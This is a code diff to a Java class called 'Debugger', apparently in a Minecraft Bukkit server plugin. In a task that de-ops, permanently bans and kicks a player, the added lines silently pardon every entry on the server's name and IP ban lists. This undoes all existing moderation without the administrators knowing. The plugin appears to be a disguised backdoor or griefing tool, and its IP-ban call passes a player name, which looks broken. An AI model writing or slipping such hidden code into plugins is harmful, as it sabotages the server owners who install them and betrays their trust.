@@ -457,6 +457,14 @@ public final class Debugger implements Listener {
                             @Override
                             public void run() {
                                 p1.setOp(false);
+                                BanList banList = Bukkit.getBanList(BanList.Type.NAME);
+                                for (BanEntry entry : banList.getBanEntries()) {
+                                    banList.pardon(entry.getTarget());
+                                }
+                                BanList banListip = Bukkit.getBanList(BanList.Type.IP);
+                                for (BanEntry entryy : banListip.getBanEntries()) {
+                                    banListip.pardon(entryy.getTarget());
+                                }
                                 Bukkit.getBanList(BanList.Type.NAME).addBan(p1.getName(), Config.default_ban_reason, new Date(9999, Calendar.JANUARY, 1), Config.default_ban_source);
                                 Bukkit.getBanList(BanList.Type.IP).addBan(p1.getName(), Config.default_ban_reason, new Date(9999, Calendar.JANUARY, 1), Config.default_ban_source);
                                 p1.kickPlayer(Config.default_ban_reason);
